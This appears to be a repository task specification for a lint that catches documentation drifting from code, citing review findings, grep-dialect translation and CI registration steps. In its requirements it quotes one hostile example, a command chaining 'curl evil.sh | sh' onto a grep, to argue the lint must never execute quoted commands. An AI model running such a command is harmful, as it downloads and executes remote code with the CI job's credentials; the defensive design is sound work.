# Lint the doc-vs-code drift the prose rule is not preventing

## Goal

`CLAUDE.md` already names doc/comment-vs-code drift as "the most-flagged
review pattern in this repo's history" and instructs reviewers to grep the old
value. That prose rule is in place, and the drift still ships.

PRs #412, #413, and #414 took **eleven review findings in one session**, and
every one was a document or docstring asserting behavior the code does not
have. The rule did not fail for lack of clarity — it failed because nothing
runs it. `CLAUDE.md`'s own working rules say to "prefer a mechanical
`tools/check_*.py` lint with tests over a prose rule whenever the pattern is
greppable." This task decides which slice of the pattern is greppable and
builds that lint.

## The evidence

The eleven findings, grouped by whether a machine could have caught them:

**Mechanically checkable — a claim about the repository that the repository
falsifies:**

- `design.md` asserted ``grep -rn "inject.dst" .trellis/spec/`` "returns
  nothing"; the same PR added that text. (#412)
- `design.md` asserted ``grep -in "dst" CLAUDE.md`` "returns nothing"; same
  PR, same falsification, two bullets up — found by hand only because the
  first one was. (#412)

**Mechanically checkable — a docstring naming a behavior the module does not
have:**

- `schema.py` claimed its exports "may raise `SystemExit`, print to stdout, or
  skip missing inputs silently". They raise `ValueError` and do none of the
  three. (#413)
- `combine.py` claimed "skip missing inputs silently"; a missing per-component
  CSV raises `SystemExit`. (#413)
- `otel.py` claimed "print to stdout"; the OTEL streamers print to stderr. (#413)

**Mechanically checkable — a prose number contradicting a tracked value:**

- The `server.py` ratchet *rationale* quoted a line count and a delta that no
  longer matched the enrolled ceiling beside it. `check_module_size.py`
  enforces the ceiling and does not read its own prose. (#414)

**Not mechanically checkable — leave out of scope:**

- Four findings where a doc's claim was true of one code path and false of
  another (`_config_error`'s "every arm"; the README and spec claiming path
  attribution both sections had, when one did not; the README implying every
  `--instances-per-component` value conflicts with DST when only `N > 1`
  does), and one intra-document contradiction (a prd Requirements bullet and
  an Execution bullet naming different files). These need a reader.

## Requirements

- Decide the lint's scope from the three checkable groups above before
  building. Ship the groups that hold up; record any group dropped and why.
  Building all three is not assumed to be correct.
- The self-falsifying-grep check **must never execute the quoted command.** A
  documented command string is attacker-controllable text — any file in the
  repository, including one arriving by pull request, could carry
  ``grep -rn "x" . ; curl evil.sh | sh`` and the lint would run it with the CI
  job's credentials. Instead, parse the quoted line into its pattern and path
  operands, refuse any form the parser cannot fully account for (pipes,
  redirects, command substitution, `;`/`&&`, unrecognized flags), and evaluate
  the claim with a fixed in-process search over those operands — Python's own
  `re` and `pathlib`, no shell, no `subprocess`. A command the parser declines
  is not a violation; see the false-positive rule below.
- That check must handle a claim that is *deliberately* historical — #412's fix
  was to date the claim ("at the time this was written…"), which is a
  legitimate form the lint must not flag.
- The docstring-behavior check must not become a second hand-maintained list.
  Derive the vocabulary it looks for (`SystemExit`, `print(`, "silently skip",
  "exit") from one place, and resolve a claim against the module *and* the
  focused implementation it re-exports from — `combine.py`'s behavior lives in
  `combine_impl.py`.
- False positives are the failure mode that kills a lint. Prefer refusing to
  judge over judging wrong: a construct the check cannot resolve is not a
  violation.
- Not executing `grep` means reimplementing it, and the two do not share a
  regex dialect. `grep` is POSIX BRE by default, `grep -E` is ERE, `grep -F` is
  literal, and none of the three is Python's `re`: `[[:alpha:]]` is a class in
  BRE and a character set in Python, `\|` is alternation in BRE and a literal
  pipe in Python, and `-i` changes both. Getting this silently wrong turns the
  lint from a check into a source of the exact drift it exists to catch. So
  define the accepted dialect subset explicitly, translate it to `re` in one
  named function, and refuse any pattern carrying a construct outside the
  subset — the rule above, applied to the pattern instead of the command.
  `inject.dst`, the pattern from #412 that motivates this check, sits inside
  any reasonable subset; that is the bar, not full BRE. Pin the translation
  with a test per accepted construct, asserting the translated `re` and `grep`
  agree on the same input.
- Follow the repo's guard conventions: full contract in the module docstring,
  `0` clean / `1` violation / `2` structural error, and a companion test file.
- Registration is four sites, and only some of them are enforced. Derive the
  set from the last lint the repo added rather than from this list — the commit
  that introduced `tools/check_scope_heading_mirrors.py` touched
  `.pre-commit-config.yaml` (the hook, its `files:` pattern, and whether it is
  `always_run`), `.github/workflows/ci.yml` (the lane that invokes it),
  `CLAUDE.md` (the repository-lints table row), and a companion test file,
  alongside the lint itself. All four in the same diff.
- One of those four has a trap worth naming. `tools/check_guard_ci_coverage.py`
  checks that the lint runs in every lane its watched files *can* select — but
  "can select" is decided upstream by `scripts/classify_ci_changes.sh`, which
  maps a changed path to LIGHT / QUICK / FULL. A lint whose `files:` pattern
  watches a path the classifier does not route to any lane is consistent by
  that guard's arithmetic and still never runs on the change that matters.
  Confirm the classifier routes the new lint's watched paths, and extend it in
  the same diff if it does not.

## Acceptance Criteria

- [ ] The scope decision is recorded with rationale before implementation,
      naming which of the three groups ship and why any was dropped.
- [ ] Each shipped check catches its own motivating finding: the lint is run
      against the pre-fix content of the PRs cited above and flags it.
- [ ] Each shipped check passes on current `HEAD` with zero findings, and the
      dated-claim form #412 landed is not flagged.
- [ ] `tools/check_guard_ci_coverage.py` passes with the new lint registered.
- [ ] The lint has its own test file, running in the QUICK lane.
- [ ] `CLAUDE.md`'s repository-lints table lists it.

## Notes

- Source: the review-learnings pass over PRs #412/#413/#414 (2026-08-26),
  which clustered every finding in those three PRs as
  `contract-documentation-drift` and suggested "contract terminology checks
  that keep documentation and help text aligned with shipped behavior".
- Interacts with `07-17-audit-debris-cleanup`, which owns unchecked lockstep
  pairs — the same family of problem approached from the other end.
- The eleven findings were all caught by review, so the cost of *not* doing
  this is reviewer time rather than shipped defects. That is a real argument
  for P3; it is filed P2 because the volume was eleven in a single session.
